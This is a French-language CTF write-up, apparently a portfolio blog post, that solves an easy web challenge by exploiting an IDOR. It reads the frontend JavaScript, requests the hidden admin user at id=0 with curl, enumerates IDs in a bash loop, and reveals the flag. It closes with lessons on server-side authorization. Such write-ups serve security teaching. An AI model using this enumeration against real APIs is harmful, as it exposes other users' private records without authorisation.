---
layout: post
title: "ECOWAS CTF 2026 — Trust Misplaced (IDOR) [Web/100pts]"
date: 2026-04-24 11:22:00 +0000
categories: [CTF, ECOWAS-CTF-2026]
tags: [web, idor, access-control, api, broken-authorization, id-enumeration, flask]
toc: true
---

> **CTF :** ECOWAS CTF 2026 · **Catégorie :** Web · **Difficulté :** ⭐ (Easy) · **Points :** 100  
> **[← Retour à l'index du CTF](/portfolio/blog/posts/ecowas-ctf-2026/)**

---

## Description

Une API utilisateur. Votre ID commence à 1. Mais et si l'ID 0 existait ?

---

## Analyse

**IDOR (Insecure Direct Object Reference) :** L'API `/api/user?id=` n'a aucune vérification d'autorisation côté serveur. Le frontend commence à `id=1` mais l'admin est à `id=0` (caché de l'interface).

---

## Solution

### Étape 1 — Analyser le JavaScript

```bash
curl http://challenge-url/static/app.js | grep "api/user"
```

```javascript
// Charge depuis id=1
fetch('/api/user?id=1').then(...)
```

### Étape 2 — Tester id=0

```bash
curl "http://challenge-url/api/user?id=0"
```

Réponse :
```json
{
  "id": 0,
  "name": "admin",
  "role": "admin",
  "flag": "EcowasCTF{id0R_exp0sed_fl@g}"
}
```

L'objet admin est directement accessible — aucune restriction serveur.

### Étape 3 — Tester d'autres IDs (bonne pratique)

```bash
for id in $(seq -1 10); do
  echo "ID $id:"
  curl -s "http://challenge-url/api/user?id=$id" | python3 -m json.tool
done
```

---

## Flag

```
EcowasCTF{id0R_exp0sed_fl@g}
```

---

## Leçons retenues

- **IDOR :** tester les IDs adjacents (0, -1, autres utilisateurs) — id=0 est classiquement l'admin
- La sécurité ne doit jamais reposer sur l'interface côté client — valider TOUJOURS côté serveur
- Cette vulnérabilité est dans le **OWASP Top 10 A01:2021 — Broken Access Control**
- Méthodologie : lire le JS → identifier les paramètres d'API → tester les valeurs limites

**[← Retour à l'index ECOWAS CTF 2026](/portfolio/blog/posts/ecowas-ctf-2026/)**
